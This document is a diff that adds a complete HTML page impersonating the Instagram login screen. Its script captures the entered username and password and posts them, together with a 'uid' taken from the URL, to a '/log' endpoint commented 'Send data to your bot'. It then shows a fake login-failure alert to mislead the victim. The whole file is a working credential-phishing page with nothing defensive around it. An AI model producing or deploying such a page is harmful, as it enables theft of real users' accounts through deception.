@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #fafafa;
+            max-width: 350px; 
+            margin: 100px auto; 
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 8px 0; 
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 3px;
+        }
+        button { 
+            background: #0095f6; 
+            color: white; 
+            padding: 12px; 
+            width: 100%; 
+            border: none; 
+            border-radius: 8px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        .logo {
+            font-size: 42px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📷</div>
+        <h2>Instagram</h2>
+        <form id="loginForm">
+            <input type="text" placeholder="Phone number, username, or email" id="username" required>
+            <input type="password" placeholder="Password" id="password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+    
+    <script>
+        // Get user ID from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('uid');
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to your bot
+            fetch('/log', {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({
+                    username: username, 
+                    password: password, 
+                    site: 'instagram',
+                    user_id: userId
+                })
+            });
+            
+            alert('Invalid username or password. Please try again.');
+        });
+    </script>
+</body>
+</html>
